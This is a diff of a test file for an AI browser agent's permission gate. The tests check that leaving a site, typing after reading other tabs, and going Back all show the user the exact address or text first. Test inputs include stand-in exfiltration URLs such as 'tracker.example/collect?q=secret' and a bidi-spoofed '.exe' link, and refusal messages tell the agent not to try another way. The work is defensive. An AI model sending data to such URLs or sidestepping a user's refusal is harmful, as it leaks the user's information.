@@ -11,7 +11,7 @@ import type { WebContents, WebContentsView } from 'electron';
 import { afterEach, describe, expect, it, vi } from 'vitest';
 import { ControlAgent, type ControlCard } from '../../src/main/control/gate';
 import type { ActHost, ControlScope, ToolMemory } from '../../src/main/control/scope';
-import { runControlTool, stepSubmits, type ControlBrowser } from '../../src/main/control/tools';
+import { heldStep, runControlTool, stepSubmits, type ControlBrowser } from '../../src/main/control/tools';
 import { runBatch } from '../../src/main/control/batch';
 import { focusToGiveBack } from '../../src/main/control/page';
 import { imageTokens } from '../../src/main/control/extract';
@@ -1324,7 +1324,7 @@ describe('acting through the gate (S18 M2c)', () => {
     let here: string | null = null;
     const t = await acting({
       onCard: () => void order.push('card'),
-      act: { mayAct: () => here, lease: { begin: async () => (order.push('lease'), null), end: () => void order.push('end') } },
+      act: { mayAct: () => here, lease: { begin: async () => (order.push('lease'), null), end: () => void order.push('end'), going: () => undefined } },
     });
     expect(result(await t.call('click', { tab_id: t.tab, ref: 'e1' })).data).toMatchObject({ done: 'Clicked “Home”' });
     expect(order).toEqual(['card', 'lease', 'end']);
@@ -1332,7 +1332,7 @@ describe('acting through the gate (S18 M2c)', () => {
     order.length = 0;
     const u = await acting({
       onCard: () => void (here = 'The user switched away from that tab. Stop, and tell them what’s left.'),
-      act: { mayAct: () => (order.includes('checked') ? here : (order.push('checked'), null)), lease: { begin: async () => (order.push('lease'), null), end: () => void order.push('end') } },
+      act: { mayAct: () => (order.includes('checked') ? here : (order.push('checked'), null)), lease: { begin: async () => (order.push('lease'), null), end: () => void order.push('end'), going: () => undefined } },
     });
     expect(refusal(await u.call('click', { tab_id: u.tab, ref: 'e1' })).refused).toBe('The user switched away from that tab. Stop, and tell them what’s left.');
     expect(u.at.input).toEqual([]);
@@ -2620,6 +2620,133 @@ describe('acting through the gate (S18 M2c)', () => {
     const t = await acting({ deep: { posts: true }, answer: 'deny', act: { siteAllowed: () => true } });
     expect(refusal(await t.call('hover', { tab_id: t.tab, ref: 'e1' })).refused).toBe('The user said no to this step. Don’t try it another way; ask the user what to do.');
     expect(t.at.debugging).toContain('Fetch.fulfillRequest');
+  });
+
+  it('the assistant leaving the site: a card every time, with the whole address; Don’t goes nowhere, Allow goes (M2e-2c, B3)', async () => {
+    const leaving = (from: string, to: string) => new URL(from).host !== new URL(to).host;
+    const t = await acting({ answer: 'deny', act: { siteAllowed: () => true, leaving } });
+    expect(refusal(await t.call('navigate', { tab_id: t.tab, url: 'https://tracker.example/collect?q=secret' })).refused).toBe('The user said no to this step. Don’t try it another way; ask the user what to do.');
+    expect(t.at.loads).toEqual([]);
+    expect(t.cards.map((c) => [c.step?.why, c.step?.going])).toEqual([['leave', 'https://tracker.example/collect?q=secret']]);
+    const u = await acting({ act: { siteAllowed: () => true, leaving } });
+    await u.call('navigate', { tab_id: u.tab, url: 'https://tracker.example/collect?q=secret' });
+    await u.call('navigate', { tab_id: u.tab, url: 'https://news.test/back' });
+    // Asked again the second time, leaving again (never remembered), and it went each time.
+    expect(u.cards.filter((c) => c.step?.why === 'leave')).toHaveLength(2);
+    expect(u.at.loads).toHaveLength(2);
+    // The same site: no card.
+    const w = await acting({ act: { siteAllowed: () => true, leaving } });
+    await w.call('navigate', { tab_id: w.tab, url: 'https://news.test/b' });
+    expect(w.cards.filter((c) => c.step?.why === 'leave')).toEqual([]);
+  });
+
+  it('typing in a chat that read anything but this tab: the exact text shown first, every time; Don’t types nothing (M2e-2c, B3; the owner’s answer 6)', async () => {
+    const t = await acting({ answer: 'deny', act: { siteAllowed: () => true, typeAsks: () => true } });
+    expect(refusal(await t.call('type', { tab_id: t.tab, ref: 'e2', text: 'W-104388' })).refused).toBe('The user said no to this step. Don’t try it another way; ask the user what to do.');
+    expect(t.at.text).toEqual([]);
+    expect(t.cards.map((c) => [c.step?.typed, c.step?.taint])).toEqual([['W-104388', true]]);
+    const u = await acting({ act: { siteAllowed: () => true, typeAsks: () => true } });
+    await u.call('type', { tab_id: u.tab, ref: 'e2', text: 'W-104388' });
+    await u.call('type', { tab_id: u.tab, ref: 'e2', text: 'W-104388' });
+    expect(u.cards.filter((c) => c.step?.taint)).toHaveLength(2);
+    expect(u.at.text).toEqual(['W-104388', 'W-104388']);
+    // A chat that read only this tab: no card.
+    const w = await acting({ act: { siteAllowed: () => true, typeAsks: () => false } });
+    await w.call('type', { tab_id: w.tab, ref: 'e2', text: 'W-104388' });
+    expect(w.cards.filter((c) => c.step?.taint)).toEqual([]);
+  });
+
+  it('typing in a chat that read elsewhere: every character it will type on the card, Show me there, and the page checked again after it (Neon’s B2, SF4 on #151)', async () => {
+    const text = `${'Thanks for the order. '.repeat(110)}W-104388`;
+    expect(text.length).toBeGreaterThan(2000);
+    const t = await acting({ act: { siteAllowed: () => true, typeAsks: () => true } });
+    await t.call('type', { tab_id: t.tab, ref: 'e2', text });
+    const card = t.cards.find((c) => c.step?.taint)!;
+    expect(card.step?.typed).toBe(text);
+    expect(card.show).toBeTypeOf('function');
+    expect(t.at.text).toEqual([text]);
+    // The site added to the Never list while the card was up: nothing typed.
+    const never: string[] = [];
+    const u = await acting({ act: { siteAllowed: () => true, typeAsks: () => true }, onCard: () => void never.push('news.test') });
+    u.scope.neverSites = () => never;
+    expect(refusal(await u.call('type', { tab_id: u.tab, ref: 'e2', text: 'W-104388' })).refused).toBe('This page can never be read (a private window, a Chord page, or a site the user keeps private).');
+    expect(u.at.text).toEqual([]);
+  });
+
+  it('the leaving card’s address is the whole one, made plain: no control or bidi characters, at most 2048; Back still goes where the card said (Neon’s B1, SF2 on #151)', async () => {
+    const leaving = (from: string, to: string) => new URL(from).host !== new URL(to).host;
+    const t = await acting({ answer: 'deny', act: { siteAllowed: () => true, leaving } });
+    await t.call('navigate', { tab_id: t.tab, url: 'https://tracker.example/collect?q=gpj\u202E.exe&x=1#done' });
+    const going = t.cards.find((c) => c.step?.why === 'leave')!.step!.going!;
+    expect(going).toContain('tracker.example/collect?q=');
+    expect(going).toContain('#done');
+    // eslint-disable-next-line no-control-regex -- control characters are exactly what it must not have
+    expect(going).not.toMatch(/[\u0000-\u001f\u202a-\u202e\u2066-\u2069]/);
+    // A pushState while the leaving card is up: Back would go somewhere else than the card said, so it doesn't.
+    let at: { history: { url: string }[]; active: number } | null = null;
+    const u = await acting({ act: { siteAllowed: () => true, leaving }, onCard: () => void (at && ((at.history = [{ url: 'https://tracker.example/a' }, { url: 'https://news.test/a' }, { url: 'https://news.test/pushed' }]), (at.active = 2))) });
+    at = u.at as never;
+    u.at.history = [{ url: 'https://tracker.example/a' }, { url: 'https://news.test/a' }];
+    u.at.active = 1;
+    expect(refusal(await u.call('back', { tab_id: u.tab })).refused).toBeTruthy();
+    expect(u.at.active).toBe(2);
+  });
+
+  it('a chat that read elsewhere: every navigate and back shows the whole address first, the same site too; one that didn’t, only leaving (Claude’s C-B3 on #151)', async () => {
+    const leaving = (from: string, to: string) => new URL(from).host !== new URL(to).host;
+    // [what, the chat read elsewhere, the call, whether it shows the address]
+    const rows: [string, boolean, (t: Awaited<ReturnType<typeof acting>>) => Promise<unknown>, boolean][] = [
+      ['the same site, read elsewhere', true, (t) => t.call('navigate', { tab_id: t.tab, url: 'https://news.test/?d=W-104388' }), true],
+      ['the same site, nothing read elsewhere', false, (t) => t.call('navigate', { tab_id: t.tab, url: 'https://news.test/?d=W-104388' }), false],
+      ['back on the same site, read elsewhere', true, (t) => ((t.at.history = [{ url: 'https://news.test/?d=W-104388' }, { url: 'https://news.test/a' }]), (t.at.active = 1), t.call('back', { tab_id: t.tab })), true],
+      ['back on the same site, nothing read elsewhere', false, (t) => ((t.at.history = [{ url: 'https://news.test/?d=W-104388' }, { url: 'https://news.test/a' }]), (t.at.active = 1), t.call('back', { tab_id: t.tab })), false],
+    ];
+    for (const [what, tainted, run, asks] of rows) {
+      const t = await acting({ answer: 'deny', act: { siteAllowed: () => true, leaving, typeAsks: () => tainted } });
+      await run(t);
+      const shown = t.cards.filter((c) => c.step?.going?.includes('d=W-104388'));
+      expect(shown.length, what).toBe(asks ? 1 : 0);
+      if (asks) expect(t.at.loads, what).toEqual([]);
+    }
+  });
+
+  it('navigate to another site: one card, the leaving card with the whole address; never the destination’s site card nor its grant (the owner’s test of the 0.15 preview)', async () => {
+    const leaving = (from: string, to: string) => new URL(from).host !== new URL(to).host;
+    const away = 'https://wiki.example/w/index.php?search=chord+progression&ns0=1';
+    // [what, the call, the chat read elsewhere, the cards it shows (kind, why, address)]
+    const rows: [string, string, boolean, [string, string | undefined, string | undefined][]][] = [
+      ['another site', away, false, [['step', 'leave', away]]],
+      ['another site, an address that signs out', 'https://wiki.example/logout?next=%2F', false, [['step', 'leave', 'https://wiki.example/logout?next=%2F']]],
+      ['the same site, not allowed yet: its site card', 'https://news.test/b?q=1', false, [['site', undefined, undefined]]],
+      ['the same site in a chat that read elsewhere: its site card, then the whole address', 'https://news.test/b?q=1', true, [['site', undefined, undefined], ['step', 'leave', 'https://news.test/b?q=1']]],
+    ];
+    for (const [what, url, tainted, cards] of rows) {
+      const t = await acting({ act: { siteAllowed: () => false, leaving, typeAsks: () => tainted } });
+      await t.call('navigate', { tab_id: t.tab, url });
+      expect(t.cards.map((c) => [c.kind, c.step?.why, c.step?.going]), what).toEqual(cards);
+      // Going there grants nothing there: acting on its page later asks its own site card.
+      expect(t.kept, what).toEqual([]);
+      expect(t.at.loads, what).toEqual([url]);
+    }
+    // An outside agent (no leaving card: its own tabs): the destination's site card, as before.
+    const u = await acting({ act: { siteAllowed: () => false } });
+    await u.call('navigate', { tab_id: u.tab, url: away });
+    expect(u.cards.map((c) => [c.kind, c.subject])).toEqual([['site', 'wiki.example']]);
+  });
+
+  it('navigate tells the lease where it goes, once its hold is on (Claude’s review of #151, Neon’s N2)', async () => {
+    const told: string[] = [];
+    const t = await acting({ act: { siteAllowed: () => true, lease: { begin: async () => null, end: () => undefined, going: (_n, url) => void told.push(url) } } });
+    await t.call('navigate', { tab_id: t.tab, url: 'https://news.test/out?to=x' });
+    expect(told).toEqual(['https://news.test/out?to=x']);
+  });
+
+  it('a held step’s card: leaving shows the whole address and what sent the tab on; another step the short one (Neon’s B1, N5 on #151)', () => {
+    const away = 'https://tracker.example/collect?secret=W-104388#done';
+    expect(heldStep([{ url: away, why: 'leave' }], ['https://tracker.example'], 'leave', 'https://news.test/a', 'news.test/out')).toMatchObject({ why: 'leave', site: 'tracker.example', going: away, from: 'news.test/out' });
+    expect(heldStep([{ url: away, why: 'leave' }], ['https://tracker.example'], 'leave', 'https://news.test/a')).toMatchObject({ going: away, from: 'A page on news.test' });
+    expect(heldStep([{ url: 'https://news.test/account/delete?id=7', why: 'delete' }], ['https://news.test'], 'delete', 'https://news.test/a')).toMatchObject({ why: 'delete', going: 'news.test/account/delete' });
+    expect(heldStep([], ['https://news.test', 'https://cdn.example'], null, 'https://news.test/a')).toMatchObject({ why: 'send', sends: ['news.test', 'cdn.example'] });
   });
 
   it('navigate to an address that signs out or deletes: the step card first; Don’t goes nowhere', async () => {
